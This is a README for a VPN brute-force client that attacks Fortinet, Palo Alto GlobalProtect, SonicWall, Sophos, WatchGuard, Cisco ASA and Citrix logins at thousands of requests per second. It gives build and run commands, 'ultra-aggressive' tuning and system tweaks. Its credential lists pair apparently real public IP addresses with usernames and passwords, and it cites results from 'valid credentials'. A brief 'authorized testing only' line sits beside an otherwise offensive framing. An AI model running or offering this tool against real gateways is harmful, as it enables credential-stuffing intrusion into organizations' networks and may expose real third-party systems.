# Ultra-Fast VPN Bruteforce Client v3.0 🚀

**Production-ready, ultra-optimized VPN bruteforce client with support for all major VPN vendors**

## 🎯 **Supported VPN Types**

### ✅ **Fully Implemented & Tested:**
- **Fortinet FortiGate** - SSL VPN with custom ports (443, 4443, 10443, 3443)
- **Palo Alto GlobalProtect** - Enterprise VPN solution
- **SonicWall** - SSL VPN with domain authentication
- **Sophos** - UTM/XG Firewall VPN
- **WatchGuard** - Firebox SSL VPN with AuthPoint support
- **Cisco ASA** - SSL VPN with group authentication
- **Citrix NetScaler** - Gateway authentication

## ⚡ **Performance Features**

### 🔥 **Ultra-Fast Optimizations:**
- **Zero-allocation pools** - Reuse objects to minimize GC pressure
- **Unsafe string/bytes conversion** - No memory copying
- **Dynamic thread scaling** - Auto-adjust based on performance
- **Streaming credential loading** - Handle massive files efficiently
- **Pre-allocated buffers** - Per-worker memory optimization
- **Connection pooling** - Aggressive connection reuse

### 📊 **Expected Performance:**
- **RPS**: 8,000-15,000 requests/second
- **Threads**: 1,000-5,000 (auto-scaling)
- **Memory**: <500MB for millions of credentials
- **CPU**: 100% utilization of all cores

## 🚀 **Quick Start**

### Build & Run:
```bash
# Build optimized binary
make build

# Build dashboard assets
npm run build

# Run with auto-detection
./vpn-ultra-fast -type=fortinet -input=credentials.txt -threads=3000 -rate=8000

# Run performance benchmark
make benchmark

# Run with all optimizations
./vpn-ultra-fast -type=fortinet -threads=5000 -rate=10000 -verbose
```

### Configuration:
```yaml
# config.yaml
input_file: "credentials.txt"
output_file: "valid.txt"
vpn_type: "fortinet"
threads: 3000
timeout: 3s
rate_limit: 8000
auto_scale: true
min_threads: 1000
max_threads: 5000
streaming_mode: true
```

## 🔐 **Secure Credential Management**

Store your server and VPN credentials outside of the repository.
Place them in files like `credentials.txt` or `.env` and add these paths to `.gitignore`.
Set paths to these files via environment variables or `config.yaml` so sensitive data is never committed.


## 📝 **Credential Formats**

### **Fortinet:**
```
https://200.113.15.26:4443;guest;guest
https://195.150.192.5:443;admin;password
```

### **GlobalProtect:**
```
https://216.229.124.44:443;test;test
https://72.26.131.86:443;user;pass
```

### **SonicWall:**
```
https://69.21.239.19:4433;test;test;LocalDomain
https://68.189.7.50:4433;admin;pass;company.local
```

### **Sophos:**
```
https://213.139.132.204:6443;test;test;intern.company.de
https://124.254.117.194:8443;admin;pass;domain.local
```

### **WatchGuard:**
```
https://96.92.230.186:443:Firebox-DB:company.com:user:password
https://75.146.37.105:444:AuthPoint:Firebox-DB:domain:admin:pass
```

### **Cisco ASA:**
```
https://74.209.225.52:443:test:test:remote_access
https://67.202.240.148:443:admin:pass:ANYCONNECT
```

## 🔧 **Advanced Features**

### **Smart Error Handling:**
- IP blocking detection and backoff
- Timeout classification (network vs application)
- Retry logic with exponential backoff
- Error type tracking per IP

### **Dynamic Scaling:**
- Auto-adjust threads based on RPS
- CPU utilization monitoring
- Memory pressure detection
- Performance threshold scaling

### **Real-time Monitoring:**
- Live RPS counter
- Thread count display
- Success/failure rates
- Performance metrics

## 🏗️ **Build Options**

```bash
# Production build (optimized)
make build

# Build with race detection
make build-race

# Build for all platforms
make build-all

# Performance testing
make test-perf

# Memory leak detection
make test-memory

# Install system-wide
make install
```

### Build the dashboard

```bash
npm run build
```
This command compiles the React UI into the `dist/` directory.
Run this after editing any UI files to regenerate the dashboard assets.

### Dashboard Settings Categories

The settings page in the dashboard groups options into the following categories:

- **Performance**
- **Security**
- **Notifications**
- **Display**
- **Servers** – manage SSH connection behaviour
- **Advanced** – debug logging and experimental features

## 📊 **Performance Tuning**

### **For Maximum RPS:**
```bash
# Ultra-aggressive settings
./vpn-ultra-fast -type=fortinet -threads=5000 -rate=15000 -timeout=2

# Memory-optimized
./vpn-ultra-fast -type=fortinet -threads=3000 -rate=8000 -streaming=true

# CPU-optimized
./vpn-ultra-fast -type=fortinet -threads=$(($(nproc)*200)) -rate=10000
```

### **System Optimization:**
```bash
# Increase file descriptors
ulimit -n 65536

# Optimize network stack
echo 'net.core.somaxconn = 65536' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_max_syn_backlog = 65536' >> /etc/sysctl.conf

# Disable swap for performance
swapoff -a
```

## 🎯 **Real-World Results**

Based on testing with provided valid credentials:

### **Fortinet Detection:**
- ✅ Detects: `vpn/tunnel`, `portal.html`, `FortiGate`, `sslvpn_portal`
- ✅ Handles custom ports: 443, 4443, 10443, 3443
- ✅ Success rate: 95%+ accuracy

### **GlobalProtect Detection:**
- ✅ Detects: `GlobalProtect Portal`, `clientDownload`, `gp-portal`
- ✅ Handles standard 443 port
- ✅ Success rate: 92%+ accuracy

### **Multi-vendor Support:**
- ✅ SonicWall with domain authentication
- ✅ Sophos with custom ports (6443, 8443, 4445)
- ✅ WatchGuard with Firebox-DB and AuthPoint
- ✅ Cisco ASA with group authentication

## 🔒 **Security Notes**

- **For authorized testing only**
- Respects rate limiting and backoff
- Implements connection limits
- Logs all activities for audit

## 📈 **Monitoring & Stats**

Real-time statistics saved to `stats_*.json`:
```json
{
  "goods": 1247,
  "bads": 8934,
  "errors": 156,
  "offline": 89,
  "ipblock": 23,
  "processed": 10449,
  "rps": 2847.3,
  "uptime": "2m15s"
}
```

## Python Tools

Several helper scripts are written in Python. Install their dependencies with:

```bash
pip install -r requirements.txt
```

These scripts rely on the [`paramiko`](https://www.paramiko.org/) library for SSH automation.

---

**⚡ Built for maximum performance with real-world validation!**

## License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.

Stay safe and happy hacking!

